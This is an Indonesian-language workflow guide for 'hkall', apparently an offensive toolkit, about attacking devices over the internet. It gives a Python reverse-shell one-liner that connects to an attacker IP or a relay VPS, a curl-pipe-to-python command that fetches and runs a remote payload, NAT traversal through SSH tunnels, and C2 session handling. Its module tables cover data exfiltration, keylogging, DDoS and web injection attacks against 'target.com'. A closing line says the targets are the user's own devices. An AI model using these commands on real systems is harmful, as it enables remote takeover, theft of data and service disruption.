# hkall — Online Target Workflow

## Apa artinya "menarget device lain secara online"

Dua device di jaringan berbeda (misal: HP di rumah, VPS di cloud, HP teman satu grup):
- Device A (attacker): menjalankan hkall
- Device T (target): yang mau diuji

Prinsip utama: **koneksi harus bisa jalan**. Kalau T nggak reachable langsung dari A
(firewall/NAT), pakai **reverse connection** (T connect balik ke A).

---

## Jalur 1: Same LAN (termudah)

Device A dan T di WiFi yang sama:
```bash
# cari IP target
hkall -m lan --host 192.168.1.0/24

# scan port
hkall -m scan --host 192.168.1.50 --ports 1-1000

# web vuln test langsung
hkall -m sqli  --host "http://192.168.1.50/app?x=1"
hkall -m xss   --host "http://192.168.1.50/search?q="
hkall -m idor  --host "http://192.168.1.50/api/user/{{id}}"
```

---

## Jalur 2: Reverse Shell (bypasses NAT/firewall, paling umum)

T prinsip: NAT/Firewall blocking inbound KE T, tapi T BOLEH connect keluar.
Solusi: T jalanin payload → payload connect ke A. A jadi listener.

### Setup di Attacker (Device A)
```bash
# buka listener, catat IP publik + port
curl ifconfig.me          # IP publik attacker (jika punya)
hkall -m c2 --port 4444    # listener aktif (PSK auth: data/c2.psk)

# NOTE: kalau attacker di NAT juga (ISP rumah), perlu:
# Option A: port forwarding di router attacker (DMZ / port 4444 forward)
# Option B: pakai VPS sebagai relay (lihat Jalur 3)
```

### Setup di Target (Device T)
Tarik payload dari A (kalau ada HTTP server):
```bash
# di T: download + jalankan payload
curl http://<IP_ATTACKER>:8080/payload.py | python3

# atau satu-liner langsung:
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("<ATTACKER_IP>",4444));[os.dup2(s.fileno(),x) for x in(0,1,2)];subprocess.call(["/bin/sh","-i"])'

# di Termux (Android):
am start -n com.termux/.HomeActivity
python3 -c '...'
```

Kalau T nggak bisa reach A langsung (misal A di NAT juga):
```bash
# buat account gratis di localhost.run / serveo.net
# di A (attacker):
ssh -o StrictHostKeyChecking=no -R 0:localhost:4444 serveo.net

# output: forward ssh connection URL
# di T: payload connect ke URL itu
```

### Setup VPS sebagai relay (paling reliable untuk online lab)

VPS = server cloud (DigitalOcean/Vultr/Oracle Free Tier).

```bash
# di VPS: buka listener
hkall -m c2 --port 4444
# PENTING: c2 sekarang pakai PSK auth (data/c2.psk di device listener).
# Target HARUS jalanin payload hasil `hkall -m payload` (PSK embed otomatis).
# One-liner sederhana di bawah TIDAK bisa auth ke listener PSK.

# di Target T: payload connect ke IP VPS
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("<VPS_IP>",4444));[os.dup2(s.fileno(),x) for x in(0,1,2)];subprocess.call(["/bin/sh","-i"])'

# di VPS: session muncul, ketik command
# di Attacker A: connect juga ke VPS (bukan langsung ke T)
# T jadi agen, A dan VPS sama-sama bisa interaksi
```

---

## Jalur 3: Port Forwarding (kalau router bisa)

Target T bisa dijangkau kalau port di-router di-forward ke T.
```bash
# router: forward port 80/443 ke IP T (192.168.1.50)
# Attacker A: scan IP publik router
hkall -m scan --host <ROUTER_PUBLIC_IP> --ports 80,443,8080
# kalau port terbuka: web service T accessible langsung
hkall -m sqli --host "http://<ROUTER_PUBLIC_IP>/app?x=1"
```

---

## Checklist sebelum testing online

1. **Reachability**: `curl http://<target>` atau `ping <target>` dari attacker jalan?
   - Kalau LAN: langsung pakai Jalur 1
   - Kalau nggak: pakai reverse shell (Jalur 2/3)
2. **Payload/Shell**: Target jalanin payload → connect balik → session muncul di attacker
3. **C2 session**: `sessions | use S1 | <cmd>` → jalan di target
4. **File transfer**: `exfil` (target push) atau `serve` (attacker push)

---

## Module yang jalan online (reachable IP/URL)

Semua modul yang terima `--host <IP/URL>` — nggak ada batasan LAN:

| modul | contoh online |
|-------|--------------|
| scan | `hkall -m scan --host <target_ip> --ports 1-1000` |
| enum | `hkall -m enum --host https://target.com` |
| whois | `hkall -m whois --host target.com` |
| subd | `hkall -m subd --host target.com` |
| sqli | `hkall -m sqli --host "https://target.com/api?x=1"` |
| xss | `hkall -m xss --host "https://target.com/search?q="` |
| csrf | `hkall -m csrf --host https://target.com/account` |
| idor | `hkall -m idor --host "https://target.com/api/user/{{id}}"` |
| ddos | `hkall -m ddos --host https://target.com` |

---

## Module yang butuh reverse (bukan direct)

Target T jalanin, hasil dikirim ke A:

| modul | bagaimana |
|-------|-----------|
| exfil | T push file ke A: `hkall -m exfil --host <A_IP> --port 12345` |
| keylog | hasil di T, catat manual / exfil |
| payload | jalankan di T, connect ke A |

---

## Security note

Semua workflow di atas: target adalah device MILIK SENDIRI (atas izin sendiri).
Ini lab security testing yang valid. Attacking perangkat orang lain tanpa izin = ilegal.
